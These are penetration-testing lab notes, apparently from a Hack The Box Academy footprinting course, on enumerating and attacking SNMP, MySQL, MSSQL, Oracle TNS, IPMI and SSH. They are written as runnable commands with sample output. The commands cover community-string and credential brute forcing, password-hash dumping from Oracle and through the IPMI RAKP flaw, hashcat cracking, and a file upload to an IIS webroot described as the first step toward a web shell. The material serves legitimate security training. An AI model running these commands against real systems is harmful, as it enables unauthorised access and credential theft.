**Purpose:** The `-v` (verbose) flag shows the complete connection process including the TLS handshake, SSL certificate details, the IMAP authentication exchange, and all IMAP commands and responses.

Key parts of the output:

```
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384
* Server certificate:
*  subject: C=US; ST=California; L=Sacramento; O=Inlanefreight; OU=Customer Support;
   CN=mail1.inlanefreight.htb; emailAddress=cry0l1t3@inlanefreight.htb
< * OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ENABLE IDLE LITERAL+ AUTH=PLAIN]
  HTB-Academy IMAP4 v.0.21.4
> A002 AUTHENTICATE PLAIN AGNyeTBsMXQzADEyMzQ=
< A002 OK Logged in
> A003 LIST "" *
< * LIST (\HasNoChildren) "." Important
< * LIST (\HasNoChildren) "." INBOX
```

The certificate reveals the admin email (`cry0l1t3@inlanefreight.htb`). The IMAP banner shows `HTB-Academy IMAP4 v.0.21.4` — a custom version string.

---

### Connect with OpenSSL — POP3

```bash
openssl s_client -connect 10.129.14.128:pop3s
```

**Purpose:** Connects to the POP3 over SSL service using OpenSSL. Shows the complete SSL handshake and certificate information, then gives you an interactive POP3 session where you can manually type POP3 commands.

### Connect with OpenSSL — IMAP

```bash
openssl s_client -connect 10.129.14.128:imaps
```

**Purpose:** Same concept but for IMAP. After the TLS handshake, you get an IMAP session where you can manually type IMAP commands. The IMAP banner at the end shows: `* OK [CAPABILITY IMAP4rev1 SASL-IR...] HTB-Academy IMAP4 v.0.21.4`


---

## Section 11: SNMP (Simple Network Management Protocol)

### What is SNMP?

SNMP is a protocol designed for monitoring and managing network devices such as routers, switches, servers, printers, and IoT devices. It uses **UDP port 161** for normal communication and **UDP port 162** for "traps" (unsolicited notifications from devices to the management server). SNMP exists in three versions: SNMPv1 (no authentication, no encryption — very insecure), SNMPv2c (community string-based, still no encryption), and SNMPv3 (username/password authentication, encryption — most secure but complex to configure).

---

### MIB and OID

The **MIB** (Management Information Base) is a hierarchical text database that describes all the objects (settings, statistics) that can be queried on a device. Each object has a unique **OID** (Object Identifier) — a sequence of numbers separated by dots (e.g., `1.3.6.1.2.1.1.5.0`). By querying OIDs, you can retrieve specific information from a device.

---

### Community Strings

Community strings are like passwords for SNMP v1 and v2. The default **public** community string is used for read access, and **private** for write access. Many administrators never change these defaults, making it easy for attackers to query device information.

---

### SNMP Versions

| Version | Security Level | Notes |
|---|---|---|
| SNMPv1 | None | No authentication beyond community string, no encryption. Everything transmitted in plain text. |
| SNMPv2c | Minimal | Community-based. Added bulk retrieval and improved error handling. Security identical to v1 — still plain text. Most widely deployed version despite its weaknesses. |
| SNMPv3 | Strong | Added proper authentication using username and password, and encryption using a pre-shared key. Uses MD5 or SHA for authentication and DES or AES for encryption. |

---

### Default SNMP Configuration

```bash
cat /etc/snmp/snmpd.conf | grep -v "#" | sed -r ''/^\s*$/d''
```

**Purpose:** Reads the SNMP daemon configuration file filtering out comments and blank lines to show only active settings.

Example output:

```
sysLocation    Sitting on the Dock of the Bay
sysContact     Me <me@example.org>
sysServices    72
master  agentx
agentaddress  127.0.0.1,[::1]
view   systemonly  included   .1.3.6.1.2.1.1
view   systemonly  included   .1.3.6.1.2.1.25.1
rocommunity  public default -V systemonly
rocommunity6 public default -V systemonly
rouser authPrivUser authpriv -V systemonly
```

`sysLocation` and `sysContact` are informational fields visible to SNMP clients — they reveal the physical location and admin contact. `rocommunity public default` means the read-only community string "public" is accessible from all hosts (default) but limited to the `systemonly` view. `agentaddress 127.0.0.1` limits SNMP to localhost only by default.

---

### Dangerous SNMP Settings

| Setting | Risk |
|---|---|
| `rwuser noauth` | Gives read-write access to the full OID tree with NO authentication whatsoever. Anyone who knows the server is running SNMP can read and modify all device settings. Extremely dangerous. |
| `rwcommunity <string> <IPv4 address>` | Grants full read-write access from a specific IP. If set to a broad subnet or "default" (meaning any host), attackers from those networks can modify device configurations. |
| `rwcommunity6 <string> <IPv6 address>` | Same as above but for IPv6. Both should be checked during enumeration. |

---

### Performing SNMP Tasks

#### SNMPwalk — Query All OIDs

```bash
snmpwalk -v2c -c public 10.129.14.128
```

Flag breakdown:

- `snmpwalk` — The SNMP enumeration tool
- `-v2c` — Use SNMP version 2c
- `-c public` — Use "public" as the community string
- `10.129.14.128` — Target IP address

**Purpose:** Walks the entire SNMP OID tree of the target device, retrieving every piece of information the device is willing to share under the specified community string.

Example output:

```
iso.3.6.1.2.1.1.1.0 = STRING: "Linux htb 5.11.0-34-generic #36~20.04.1-Ubuntu SMP..."
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (5134) 0:00:51.34
iso.3.6.1.2.1.1.4.0 = STRING: "mrb3n@inlanefreight.htb"
iso.3.6.1.2.1.1.5.0 = STRING: "htb"
iso.3.6.1.2.1.1.6.0 = STRING: "Sitting on the Dock of the Bay"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/boot/vmlinuz-5.11.0-34-generic root=UUID=..."
iso.3.6.1.2.1.25.6.3.1.2.1232 = STRING: "printer-driver-sag-gdi_0.1-7_all"
iso.3.6.1.2.1.25.6.3.1.2.1243 = STRING: "python3_3.8.2-0ubuntu2_amd64"
```

What this tells you: The first OID gives the OS and kernel version (Linux Ubuntu). OID `.1.4.0` reveals the admin''s email (`mrb3n@inlanefreight.htb`). OID `.1.5.0` gives the hostname (`htb`). OID `.1.6.0` gives the physical location. The package list shows every installed software package — extremely valuable for finding vulnerable software versions.

#### OneSixtyOne — Brute Force Community Strings

Installation:

```bash
sudo apt install onesixtyone
```

Command:

```bash
onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.14.128
```

**Purpose:** Uses a wordlist to brute force the community string. If a valid one is found, it shows the system description.

- `-c /opt/useful/seclists/Discovery/SNMP/snmp.txt` — Wordlist of community strings to try
- `10.129.14.128` — Target IP

Example output:

```
Scanning 1 hosts, 3220 communities
10.129.14.128 [public] Linux htb 5.11.0-37-generic #41~20.04.2-Ubuntu SMP...
```

Found "public" as a valid community string. The system description is shown confirming successful access. Now you can use this community string with snmpwalk.

#### Braa — Fast OID Brute Force

Installation:

```bash
sudo apt install braa
```

Command:

```bash
braa public@10.129.14.128:.1.3.6.*
```

**Purpose:** Once you have a valid community string, use braa to rapidly query all OIDs matching the pattern. Much faster than snmpwalk for broad enumeration because it sends many requests simultaneously.

Syntax: `braa <community string>@<IP>:<OID pattern>`

The `*` wildcard matches all OIDs starting with `.1.3.6.` — which covers the entire standard SNMP MIB tree.

Example output:

```
10.129.14.128:20ms:.1.3.6.1.2.1.1.1.0:Linux htb 5.11.0-34-generic...
10.129.14.128:20ms:.1.3.6.1.2.1.1.2.0:.1.3.6.1.4.1.8072.3.2.10
10.129.14.128:20ms:.1.3.6.1.2.1.1.3.0:548
10.129.14.128:20ms:.1.3.6.1.2.1.1.4.0:mrb3n@inlanefreight.htb
10.129.14.128:20ms:.1.3.6.1.2.1.1.5.0:htb
10.129.14.128:20ms:.1.3.6.1.2.1.1.6.0:US
10.129.14.128:20ms:.1.3.6.1.2.1.1.7.0:78
```

The response time (20ms) shows how fast braa operates. Results confirm the admin email, hostname, and location.

---

## Section 12: MySQL

### What is MySQL?

MySQL is an open-source relational database management system (RDBMS) developed by Oracle. It stores data in tables with rows and columns and uses SQL (Structured Query Language) for queries. MySQL works on a client-server model — the MySQL server manages the data, and clients send queries to it. It is commonly used with web applications, especially in the LAMP stack (Linux, Apache, MySQL, PHP). Common use cases include storing website content, user credentials, product information, and configuration data. Sensitive data like passwords should be stored as hashed values, not plain text. MySQL typically runs on **TCP port 3306**.

---

### Default MySQL Configuration

```bash
sudo apt install mysql-server -y
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | sed -r ''/^\s*$/d''
```

Default port is 3306. The configuration shows the socket path, data directory, log settings, and other parameters.

---

### Dangerous MySQL Settings

| Setting | Risk |
|---|---|
| `user` | Which OS user the MySQL service runs as (if set to root, very dangerous — any vulnerability could give OS-level root access) |
| `password` | Plain text password in config file — anyone who can read the file gets database access |
| `admin_address` | IP that admin interface listens on. If set to `0.0.0.0`, accessible from all interfaces. |
| `debug` | Enables verbose debug output (may expose sensitive info to web app users) |
| `sql_warnings` | Shows detailed warnings that can leak info through error messages |
| `secure_file_priv` | Controls file import/export operations. If empty, no restrictions — MySQL can read any file the mysql user can access. |

---

### Footprinting MySQL with Nmap

```bash
sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*
```

**Purpose:** The `mysql*` wildcard runs all MySQL-related scripts including `mysql-brute`, `mysql-empty-password`, `mysql-enum`, and `mysql-info`. This reveals the MySQL version, authentication plugin, and may even show valid usernames.

Example output:

```
PORT     STATE SERVICE     VERSION
3306/tcp open  nagios-nsca Nagios NSCA
| mysql-brute:
|   Accounts:
|     root:<empty> - Valid credentials
|_  Statistics: Performed 45010 guesses in 5 seconds
| mysql-empty-password:
|_  root account has empty password
| mysql-enum:
|   Valid usernames:
|     root:<empty> - Valid credentials
|     netadmin:<empty> - Valid credentials
|     guest:<empty> - Valid credentials
|     admin:<empty> - Valid credentials
|     test:<empty> - Valid credentials
| mysql-info:
|   Protocol: 10
|   Version: 8.0.26-0ubuntu0.20.04.1
|   Thread ID: 13
|   Auth Plugin Name: caching_sha2_password
```

The `mysql-empty-password` script found that root has no password — a critical finding. `mysql-enum` found multiple valid usernames all with empty passwords.

---

### Performing MySQL Tasks

#### Connect to MySQL (No Password)

```bash
mysql -u root -h 10.129.14.132
```

If the server requires a password, you get an "Access denied" error. If it connects, the server allows passwordless root login — a critical security issue.

#### Connect with Password

```bash
mysql -u root -pP4SSw0rd -h 10.129.14.128
```

> **Note:** No space between `-p` and the password.

Successful connection:

```
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 150165
Server version: 8.0.27-0ubuntu0.20.04.1 (Ubuntu)

MySQL [(none)]>
```

#### Show All Databases

```sql
MySQL [(none)]> show databases;
```

Example output:

```
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
4 rows in set (0.006 sec)
```

`information_schema` contains metadata about all databases and tables. `mysql` contains user accounts and privileges. `performance_schema` contains performance monitoring data. `sys` contains human-readable views of performance data.

#### Select a Database

```sql
MySQL [(none)]> use mysql;
```

#### Show Tables in Selected Database

```sql
MySQL [mysql]> show tables;
```

#### Show All Columns in a Table

```sql
show columns from user;
```

#### Select All Data from a Table

```sql
select * from user;
```

#### Check MySQL Version

```sql
select version();
```

#### View Connected Hosts

```sql
use sys;
select host, unique_users from host_summary;
```

Example output:

```
+-------------+--------------+
| host        | unique_users |
+-------------+--------------+
| 10.129.14.1 |            1 |
| localhost   |            2 |
+-------------+--------------+
```

#### Search for Specific String

```sql
select * from customers where email = "test@example.com";
```

---

## Section 13: MSSQL (Microsoft SQL Server)

### What is MSSQL?

MSSQL is Microsoft''s proprietary relational database management system. It was built primarily for Windows systems and integrates deeply with the Windows OS and the .NET framework. MSSQL is very popular in enterprise environments especially those running Windows Server infrastructure. It has strong native support for Windows Authentication, meaning domain credentials can be used to authenticate to the database. MSSQL runs on **TCP port 1433** by default.

---

### MSSQL Client Tools

- **SQL Server Management Studio (SSMS)** — GUI-based client, often installed on admin machines. If found on a compromised machine with saved credentials, it can lead to direct database access.
- **Impacket''s mssqlclient.py** — Command-line Python tool, very useful for penetration testers.

Finding mssqlclient.py:

```bash
locate mssqlclient
```

Output:

```
/usr/bin/impacket-mssqlclient
/usr/share/doc/python3-impacket/examples/mssqlclient.py
```

---

### Default MSSQL Databases

| Database | Description |
|---|---|
| `master` | Tracks all system information for the SQL server instance. Always present. |
| `model` | Template for new databases. Any settings in model are automatically included in all newly created databases. |
| `msdb` | Used by SQL Server Agent for scheduling jobs and alerts. Contains job history and scheduling information. |
| `tempdb` | Stores temporary objects. Recreated from scratch every time SQL Server starts. Contains no persistent data. |
| `resource` | A read-only hidden database containing all system objects included with SQL Server. |

---

### Dangerous MSSQL Configurations

| Issue | Risk |
|---|---|
| Clients connecting without encryption | Credentials sent in plain text — interceptable by anyone on the same network. |
| Self-signed certificates | Can be spoofed — man-in-the-middle attacks are possible. |
| Named pipes enabled | Alternative connection method that can bypass firewall rules. |
| Default sa (System Administrator) account with weak or empty password | Direct full-database access without authentication. |

---

### Footprinting MSSQL with Nmap

```bash
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248
```

Script breakdown:

| Script | Purpose |
|---|---|
| `ms-sql-info` | Gets server name, instance name, version, named pipe path, clustering status |
| `ms-sql-empty-password` | Checks if sa or other accounts have empty passwords |
| `ms-sql-xp-cmdshell` | Tests if the dangerous xp_cmdshell stored procedure (allows OS command execution) is enabled |
| `ms-sql-config` | Retrieves configuration settings |
| `ms-sql-ntlm-info` | Gets NTLM information from the authentication challenge |
| `ms-sql-tables` | Lists tables in accessible databases |
| `ms-sql-hasdbaccess` | Checks which databases the user has access to |
| `ms-sql-dac` | Checks for the Dedicated Administrator Connection |
| `ms-sql-dump-hashes` | Attempts to dump password hashes |

Example output:

```
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info:
|   Target_Name: SQL-01
|   NetBIOS_Domain_Name: SQL-01
|   NetBIOS_Computer_Name: SQL-01
|   DNS_Domain_Name: SQL-01
|   DNS_Computer_Name: SQL-01
|_  Product_Version: 10.0.17763
| ms-sql-info:
|   Windows server name: SQL-01
|   10.129.201.248\MSSQLSERVER:
|     Instance name: MSSQLSERVER
|     Version: Microsoft SQL Server 2019 RTM
|     number: 15.00.2000.00
|     TCP port: 1433
|     Named pipe: \\10.129.201.248\pipe\sql\query
|_    Clustered: false
```

This reveals the server hostname (SQL-01), it is not clustered, SQL Server 2019 version, and the named pipe path.

---

### Metasploit — MSSQL Ping

```
msf6 > use auxiliary/scanner/mssql/mssql_ping
msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts 10.129.201.248
msf6 auxiliary(scanner/mssql/mssql_ping) > run
```

**Purpose:** The mssql_ping Metasploit module sends special MSSQL discovery packets to the target and retrieves key information.

Example output:

```
[*] 10.129.201.248:       - SQL Server information for 10.129.201.248:
[+] 10.129.201.248:       -    ServerName      = SQL-01
[+] 10.129.201.248:       -    InstanceName    = MSSQLSERVER
[+] 10.129.201.248:       -    IsClustered     = No
[+] 10.129.201.248:       -    Version         = 15.0.2000.5
[+] 10.129.201.248:       -    tcp             = 1433
[+] 10.129.201.248:       -    np              = \\SQL-01\pipe\sql\query
[*] Scanned 1 of 1 hosts (100% complete)
```

---

### Connecting with mssqlclient.py

```bash
python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
```

**Purpose:** Connects to the MSSQL server using Windows Authentication (Active Directory domain credentials). The `-windows-auth` flag uses NTLM/Kerberos authentication instead of SQL Server authentication.

Connection process:

```
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password: [enter password here]
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] INFO(SQL-01): Line 1: Changed database context to ''master''.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands

SQL>
```

#### List Databases

```sql
SQL> select name from sys.databases
```

Example output:

```
name
----
master
tempdb
model
msdb
Transactions
```

The first four are default system databases. "Transactions" is a custom database added by the organization — a prime target for investigation.


---

## Section 14: Oracle TNS

### What is Oracle TNS?

Oracle TNS (Transparent Network Substrate) is a proprietary communication protocol from Oracle used to connect Oracle databases with client applications. It supports multiple network protocols and provides built-in encryption. TNS is widely used in healthcare, finance, and retail industries for large database management. The TNS listener runs on **TCP port 1521** by default and manages incoming connection requests, routing them to the correct database instance.

Two key configuration files exist: `tnsnames.ora` (client-side, maps service names to network addresses) and `listener.ora` (server-side, defines what the listener process does). Both are typically in `$ORACLE_HOME/network/admin/`.

---

### Oracle SID

The SID (System Identifier) uniquely identifies a database instance on a server. When connecting to Oracle, you must specify the SID. If the SID is unknown, it must be discovered through enumeration or brute forcing. Common default SIDs include "ORCL", "XE" (Express Edition), and "PROD".

---

### Oracle TNS Configuration Files

Example `tnsnames.ora`:

```
ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
```

This defines a service called "ORCL" at IP 10.129.11.102 on port 1521 using TCP, connecting to the database instance named "orcl" with a dedicated server connection.

Example `listener.ora`:

```
SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
    )
  )

LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
    )
  )
```

The listener handles connections for the PDB1 instance and listens on both TCP port 1521 and an IPC socket.

---

### Setting Up ODAT

```bash
sudo apt-get install -y build-essential python3-dev libaio1
git clone https://github.com/quentinhardy/odat.git
cd odat/
pip install python-libnmap
git submodule init
git submodule update
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome openpyxl
```

**Purpose:** Installs all dependencies and ODAT (Oracle Database Attacking Tool) — a comprehensive penetration testing tool for Oracle databases that can enumerate users, brute force credentials, test for vulnerabilities, and exploit misconfigurations.

Verify installation:

```bash
./odat.py -h
```

---

### Footprinting Oracle TNS with Nmap

#### Basic TNS Scan

```bash
sudo nmap -p1521 -sV 10.129.204.235 --open
```

**Purpose:** Checks if the Oracle TNS listener is running and gets its version. The `--open` flag shows only open ports.

Example output:

```
PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
```

Confirms the Oracle TNS listener is running version 11.2.0.2.0. The "(unauthorized)" means no authentication is required to query the listener.

#### Nmap SID Brute Force

```bash
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```

**Purpose:** Uses the `oracle-sid-brute` NSE script to try common SID names against the Oracle TNS listener to discover valid database instance identifiers.

Example output:

```
PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
| oracle-sid-brute:
|_  XE
```

Found SID "XE" (Oracle Express Edition). Now you can try to connect to this specific database instance.

#### ODAT — Full Enumeration

```bash
./odat.py all -s 10.129.204.235
```

**Purpose:** Runs ALL ODAT modules against the target Oracle server. This attempts credential discovery, SID enumeration, user enumeration, vulnerability checks, and more.

Key output:

```
[+] Checking if target 10.129.204.235:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.204.235:1521 is well configured.

[!] Notice: ''mdsys'' account is locked, so skipping...
[!] Notice: ''oracle_ocm'' account is locked, so skipping...
[+] Valid credentials found: scott/tiger. Continue...
```

ODAT found valid credentials: username `scott` with password `tiger`. These are famous default Oracle credentials that have been known for decades but are still found in the wild.

---

### Installing SQLplus

```bash
sudo apt update
sudo apt upgrade parrot-core
sudo apt install oracle-instantclient-sqlplus
```

Verify it works:

```bash
sqlplus -v
```

Output:

```
SQL*Plus: Release 19.0.0.0.0 - Production
Version 19.6.0.0.0
```

Fixing library error (if it occurs):

```bash
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"
sudo ldconfig
```

---

### Connecting to Oracle with SQLplus

```bash
sqlplus scott/tiger@10.129.204.235/XE
```

**Purpose:** Connects to the Oracle database instance XE using the discovered credentials. Format is `username/password@server_IP/SID`.

Successful connection:

```
SQL*Plus: Release 19.0.0.0.0 - Production

ERROR:
ORA-28002: the password will expire within 7 days

Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL>
```

Even with a password expiry warning, you are connected.

---

### Oracle SQL Commands

#### List All Tables

```sql
SQL> select table_name from all_tables;
```

**Purpose:** Lists all tables visible to the current user across all schemas.

#### Check User Privileges

```sql
SQL> select * from user_role_privs;
```

Example output:

```
USERNAME     GRANTED_ROLE    ADM DEF OS_
------------ --------------- --- --- ---
SCOTT        CONNECT         NO  YES NO
SCOTT        RESOURCE        NO  YES NO
```

Scott has CONNECT (can log in) and RESOURCE (can create objects) roles but no DBA privileges.

#### Connect as SYSDBA (Admin)

```bash
sqlplus scott/tiger@10.129.204.235/XE as sysdba
```

**Purpose:** Attempts to connect with DBA privileges. If scott has been granted the SYSDBA system privilege, this elevates access to full database administrator level.

Successful connection:

```
Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL>
```

#### Verify Elevated Privileges

```sql
SQL> select * from user_role_privs;
```

Output as SYSDBA:

```
USERNAME  GRANTED_ROLE                   ADM DEF OS_
--------- ------------------------------ --- --- ---
SYS       ADM_PARALLEL_EXECUTE_TASK      YES YES NO
SYS       APEX_ADMINISTRATOR_ROLE        YES YES NO
SYS       DBA                            YES YES NO
```

Now connected as SYS with full DBA privileges. Complete database control achieved.

#### Extract Password Hashes

```sql
SQL> select name, password from sys.user$;
```

**Purpose:** Retrieves hashed passwords from the system user table, which can be cracked offline.

Example output:

```
NAME           PASSWORD
-------------- ------------------------------
SYS            FBA343E7D6C8BC9D
PUBLIC
SYSTEM         B5073FE1DE351687
OUTLN          4A3BA55E08595C81
```

SYS and SYSTEM have DES-encrypted password hashes. These old Oracle DES hashes are weak and can be cracked quickly.

#### Upload a File via ODAT (Web Shell)

Step 1 — Create test file:

```bash
echo "Oracle File Upload Test" > testing.txt
```

Step 2 — Upload via ODAT:

```bash
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

**Purpose:** Uses ODAT''s UTL_FILE module to upload a local file to the server''s web root directory. If the Oracle server also runs IIS (Windows web server), uploading to `C:\inetpub\wwwroot` places the file in the publicly accessible web directory.

Flag breakdown:

- `utlfile` — ODAT module that uses Oracle''s UTL_FILE package for file operations
- `-s 10.129.204.235` — Target server
- `-d XE` — Target database SID
- `-U scott -P tiger` — Credentials
- `--sysdba` — Connect as SYSDBA for elevated file access
- `--putFile C:\\inetpub\\wwwroot` — Destination directory on the server
- `testing.txt` — Destination filename
- `./testing.txt` — Local source file

Output:

```
[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server
```

Step 3 — Verify the upload:

```bash
curl -X GET http://10.129.204.235/testing.txt
```

Output:

```
Oracle File Upload Test
```

The file is accessible via HTTP — confirming you can upload files through Oracle to the web server. The next step in a real penetration test would be uploading a web shell (ASPX/PHP) instead of a text file, enabling remote command execution.


---

## Section 15: IPMI (Intelligent Platform Management Interface)

### What is IPMI?

IPMI is a hardware-level management system that allows administrators to manage servers independently of the operating system. Even if a server is powered off, crashed, or unresponsive, IPMI can still be used to reboot it, check hardware status, read temperature and fan speed, view hardware logs, and even reinstall the operating system. IPMI communicates over **UDP port 623** and requires a Baseboard Management Controller (BMC) — a small embedded processor directly connected to the server''s motherboard. Common BMC implementations are HP iLO, Dell iDRAC, and Supermicro IPMI.

---

### IPMI Components

| Component | Description |
|---|---|
| BMC (Baseboard Management Controller) | The core component. A microcontroller embedded on the server motherboard. Operates independently of the main CPU and OS. Common implementations: HP iLO, Dell iDRAC, Supermicro IPMI. |
| ICMB (Intelligent Chassis Management Bus) | Allows communication between multiple server chassis, enabling management of chassis components like power supplies and cooling fans. |
| IPMB (Intelligent Platform Management Bus) | Extends the BMC''s reach to other hardware components on the motherboard using an I2C-based bus. |
| IPMI Memory | Non-volatile storage for the System Event Log (SEL), sensor data repository, and field replacement unit information. |
| Communications Interfaces | Multiple ways to access the BMC: local system interface (KCS, SMIC, BT), serial interface, LAN interface (port 623 UDP), and ICMB interface. |

---

### Default BMC Credentials

Many BMC devices ship with default passwords that administrators never change:

| Device | Username | Default Password |
|---|---|---|
| Dell iDRAC | root | calvin |
| HP iLO | Administrator | randomly generated 8-character string of numbers and uppercase letters (usually printed on a label on the server) |
| Supermicro IPMI | ADMIN | ADMIN |

---

### Footprinting IPMI with Nmap

```bash
sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
```

**Purpose:** Uses UDP scan to check for IPMI on port 623. The `ipmi-version` NSE script specifically identifies the IPMI version and authentication methods supported.

Flag breakdown:

- `sudo` — Required for UDP scanning
- `-sU` — UDP scan (IPMI uses UDP not TCP)
- `--script ipmi-version` — Run the IPMI version detection script
- `-p 623` — Scan only port 623
- `ilo.inlanfreight.local` — Target hostname

Example output:

```
PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|   Version:
|     IPMI-2.0
|   UserAuth:
|   PassAuth: auth_user, non_null_user
|_  Level: 2.0
MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)
```

Confirms IPMI 2.0 is running. The MAC address prefix identifies it as a Hewlett Packard Enterprise server.

---

### Metasploit — IPMI Version Discovery

```
msf6 > use auxiliary/scanner/ipmi/ipmi_version
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options
msf6 auxiliary(scanner/ipmi/ipmi_version) > run
```

**Purpose:** The Metasploit ipmi_version module sends IPMI discovery requests and reports back the version and authentication capabilities of the target BMC.

Example output:

```
[*] Sending IPMI requests to 10.129.42.195->10.129.42.195 (1 hosts)
[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user)
PassAuth(password, md5, md2, null) Level(1.5, 2.0)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

This reveals that the BMC supports both IPMI 1.5 and 2.0, and even supports null (no password) authentication — a finding worth investigating.

---

### RAKP Protocol Vulnerability

The RAKP (Remote Authenticated Key-Exchange Protocol) vulnerability is a critical flaw in IPMI 2.0 that affects all implementations. During the IPMI 2.0 authentication process, the server sends a salted SHA1 or MD5 hash of the user''s password **to the client BEFORE authentication is complete**. This allows attackers to capture password hashes for any valid user account without completing the login. The hash can then be cracked offline. There is no patch for this because it is part of the IPMI 2.0 specification itself. The only mitigations are using very strong passwords or network segmentation to restrict BMC access.

---

### Metasploit — Dump IPMI Hashes

```
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
```

**Purpose:** Exploits the RAKP vulnerability to retrieve password hashes from the BMC for all valid user accounts. The module also automatically attempts to crack common passwords from a built-in wordlist.

Example output:

```
[+] 10.129.42.195:623 - IPMI - Hash found:
ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea
123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e

[+] 10.129.42.195:623 - IPMI - Hash for user ''ADMIN'' matches password ''ADMIN''
[*] Scanned 1 of 1 hosts (100% complete)
```

The hash was captured AND cracked immediately — the ADMIN account uses the password "ADMIN" (the default). Now you can log into the BMC''s web console with these credentials, gaining full hardware-level access to the server.

#### Crack with Hashcat (mode 7300)

```bash
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

This uses Hashcat mode 7300 (IPMI2 RAKP HMAC-SHA1) with a mask attack trying all 8-character combinations of digits and uppercase letters — targeting HP iLO factory default password format.

---

## Section 16: Linux Remote Management Protocols

### SSH (Secure Shell)

#### What is SSH?

SSH (Secure Shell) enables encrypted remote access to Linux/Unix systems over **TCP port 22**. It replaced older insecure protocols like Telnet and R-Services. SSH-2 is more secure than SSH-1 and is not vulnerable to Man-in-the-Middle attacks. OpenSSH supports six authentication methods: password authentication, public-key authentication, host-based authentication, keyboard authentication, challenge-response authentication, and GSSAPI authentication.

---

#### Public Key Authentication — How It Works

1. You generate a key pair: `ssh-keygen -t rsa -b 4096`
2. Your public key (`~/.ssh/id_rsa.pub`) is added to the server''s `~/.ssh/authorized_keys`
3. Your private key (`~/.ssh/id_rsa`) stays on your machine, protected by a passphrase
4. When connecting, the server encrypts a random challenge using your public key
5. Your SSH client decrypts it with the private key and sends back the solution
6. The server verifies the solution — if correct, access is granted
7. Your passphrase is never sent over the network — only used locally to unlock the private key

---

#### Default SSH Configuration

```bash
cat /etc/ssh/sshd_config | grep -v "#" | sed -r ''/^\s*$/d''
```

Example output:

```
Include /etc/ssh/sshd_config.d/*.conf
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server
```

---

#### Dangerous SSH Settings

| Setting | Risk |
|---|---|
| `PasswordAuthentication yes` | Allows brute force attacks against passwords |
| `PermitEmptyPasswords yes` | Allows login with no password — critical vulnerability |
| `PermitRootLogin yes` | Root can log in directly — should always be set to `no` or `prohibit-password` |
